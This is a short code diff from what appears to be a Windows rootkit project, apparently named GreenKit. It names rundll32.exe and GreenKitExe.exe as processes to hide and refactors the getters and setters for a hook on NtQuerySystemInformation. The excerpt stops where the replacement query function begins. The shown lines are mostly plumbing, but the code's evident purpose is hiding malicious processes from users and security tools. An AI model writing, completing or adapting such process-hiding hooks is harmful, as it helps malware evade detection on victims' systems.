@@ -6,27 +6,16 @@
 const wchar_t* m_ProcessToHide = L"rundll32.exe";
 const wchar_t* m_ProcessToHide2 = L"GreenKitExe.exe";
 
-TD_NtQuerySystemInformation oldNtQuery;
 TD_NtQuerySystemInformation hookNtQuery;
 
-TD_NtQuerySystemInformation GetHookNtQuery()
+TD_NtQuerySystemInformation GetNtQuery()
 {
     return hookNtQuery;
 }
 
-TD_NtQuerySystemInformation GetOldHookNtQuery()
-{
-    return oldNtQuery;
-}
-
-VOID SetHookNtQuery(TD_NtQuerySystemInformation p_HookNtQuery)
+VOID SetNtQuery(TD_NtQuerySystemInformation p_HookNtQuery)
 {
     hookNtQuery = p_HookNtQuery;
-}
-
-VOID SetOldHookNtQuery(TD_NtQuerySystemInformation p_OldHookNtQuery)
-{
-    oldNtQuery = p_OldHookNtQuery;
 }
 
 NTSTATUS WINAPI NewNtQuerySystemInformation(
